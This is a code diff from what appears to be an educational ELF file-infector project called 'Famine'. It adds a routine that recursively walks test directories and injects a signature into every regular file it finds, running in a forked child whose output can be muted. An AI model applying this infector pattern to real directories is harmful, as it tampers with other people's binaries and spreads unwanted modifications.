@@ -1,5 +1,15 @@
 #include "../include/famine.h"
 
+void famine(char *fullpath) {
+    FamineFile *file = elf_file_get(fullpath);
+    if (file != NULL) {
+        DBG("ELF file loaded successfully. Size: %lu bytes\n", file->size);
+        inject_signature(file);
+        destroy_famine_file(file);
+    } else {
+        LOG(L_ERROR, "Failed to load ELF file.\n");
+    }
+}
 
 void list_recursive(const char *path) {
     struct dirent *entry;
@@ -10,43 +20,38 @@ void list_recursive(const char *path) {
     if (!dir) return;
 
     while ((entry = readdir(dir)) != NULL) {
-        if (!ft_strcmp(entry->d_name, ".") || !ft_strcmp(entry->d_name, "..")) continue;
+        if (!ft_strcmp(entry->d_name, ".") || !ft_strcmp(entry->d_name, "..")) {
+            continue;
+        }
 
         snprintf(fullpath, sizeof(fullpath), "%s/%s", path, entry->d_name);
 
-        if (lstat(fullpath, &st) == -1) continue;
+        if (lstat(fullpath, &st) == -1 || S_ISLNK(st.st_mode)) {
+            continue;
+        }
 
-        if (S_ISLNK(st.st_mode)) continue;
-
-        if (S_ISDIR(st.st_mode)) list_recursive(fullpath);
-        else printf("%s\n", fullpath);
+        if (S_ISDIR(st.st_mode)) {
+            list_recursive(fullpath);
+        } else {
+            famine(fullpath);
+        }
     }
 
     closedir(dir);
 }
 
-
 int main(void) {
-    set_log_level(L_DEBUG);
+    set_log_level(L_INFO);
     DBG("This is a debug message.\n");
 
     pid_t pid = fork();
 
     if (pid == 0) {
-        FamineFile *file = elf_file_get("./ls");
-
         if (*get_log_level() == L_NONE) {
             mute_output();
         }
-
-        if (file != NULL) {
-            DBG("ELF file loaded successfully. Size: %lu bytes\n", file->size);
-            inject_signature(file);
-            destroy_famine_file(file);
-        } else {
-            LOG(L_ERROR, "Failed to load ELF file.\n");
-        }
-
+        list_recursive(TMPTEST_PATH);
+        list_recursive(TMPTEST2_PATH);
     }
 
     wait(NULL);
